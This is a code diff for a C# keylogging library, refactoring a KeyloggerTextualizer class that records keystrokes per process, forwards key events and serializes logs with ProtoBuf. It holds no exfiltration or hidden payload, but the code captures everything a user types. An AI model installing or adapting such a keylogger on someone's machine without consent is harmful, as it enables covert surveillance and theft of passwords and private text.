@@ -9,14 +9,44 @@ using ProtoBuf;
 namespace nucs.Windows.Keyboard.Highlevel {
 
     [ProtoContract]
-    public class KeyloggerTextualizer : KeyboardLogger {
+    public class KeyloggerTextualizer : IKeylogTexualizer {
         public event Action<LoggedLine> LineClosed;
-        public KeyloggerTextualizer(bool IsConsoleApp = false) : base(IsConsoleApp) {
-            base.KeyPress += OnKeyPress;
+        private readonly KeyboardLogger kbl;
+        public KeyloggerTextualizer(bool IsConsoleApp = false) {
+            kbl = new KeyboardLogger(IsConsoleApp);
+            kbl.KeyPress += OnKeyPress;
         }
 
+        public event KeyEventHandler KeyPress {
+            add { kbl.KeyPress += value; }
+            remove { kbl.KeyPress -= value; }
+        }
+
+        public event KeyEventHandler KeyUp {
+            add { kbl.KeyUp += value; }
+            remove { kbl.KeyUp -= value; }
+        }
+
+        public event KeyEventHandler KeyDown {
+            add { kbl.KeyDown += value; }
+            remove { kbl.KeyDown -= value; }
+        }
+
+        /// <summary>
+        /// Disable multiple (basically a spam) of firing button down event. True by default.
+        /// </summary>
+        public bool SuppressKeyHold {
+            get { return kbl.SuppressKeyHold; }
+            set { kbl.SuppressKeyHold = value; }
+        }
+
+        /// <summary>
+        ///     For serializing purposes, won't actually log.
+        /// </summary>
+        private KeyloggerTextualizer() : this(false) { }
+
         [ProtoMember(1)]
-        public List<ProcessLog> ActiveLogs = new List<ProcessLog>();
+        public List<ProcessLog> ActiveLogs { get; } = new List<ProcessLog>();
 
         /// <summary>
         ///     Handles a key press event
@@ -36,7 +66,14 @@ namespace nucs.Windows.Keyboard.Highlevel {
             topmost_log.AddContent(lk);
         }
 
-        public string Output() {
+        /// <summary>
+        ///     Clears all of the lines recorded up to now.
+        /// </summary>
+        public void Clear() {
+            ActiveLogs.ForEach(logs => logs.Logs.RemoveWhere(line => line.EndRecord != null && line.EndRecord != DateTime.MinValue));
+        }
+
+        public virtual string Output() {
             var sb = new StringBuilder();
             foreach (var p in ActiveLogs.ToArray()) {
                 sb.AppendLine("---Process: " + p.Process.Name);
